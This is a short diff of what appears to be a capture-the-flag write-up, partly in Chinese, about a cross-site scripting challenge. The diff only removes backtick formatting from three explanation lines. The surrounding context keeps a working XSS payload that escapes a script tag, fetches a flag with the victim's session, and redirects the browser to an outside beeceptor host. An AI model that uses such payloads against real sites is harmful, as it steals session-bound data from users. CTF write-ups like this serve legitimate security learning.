@@ -64,7 +64,7 @@ Payload: `http://h4ck3r.quest:8800/?type=error&message=%3C/script%3E%3Cscript%3E
         ```
         http://h4ck3r.quest:8800/?message=%3C/script%3E%3Cscript%3Efetch(`/getflag\).then(r=%3Er.text()).then(flag=%3Elocation.href=`https://sbk6401.free.beeceptor.com/?f=${flag}`)%3C/script%3E//
         ```
-    * `fetch(\`/getflag\`)`: 先用受害者的權限(可能是cookie或是session)請求flag
-    * `.then(r=>r.text())`: 把response轉成文字
-    * `location.href=\`https://your-server/?f=${flag}\``: 瀏覽器跳轉到我指定的server，這樣子的話就會帶上從victim取得的flag
+    * fetch(`/getflag`): 先用受害者的權限(可能是cookie或是session)請求flag
+    * .then(r=>r.text()): 把response轉成文字
+    * location.href=`https://your-server/?f=${flag}`: 瀏覽器跳轉到我指定的server，這樣子的話就會帶上從victim取得的flag
 4. Report to admin. Then you got flag!!!
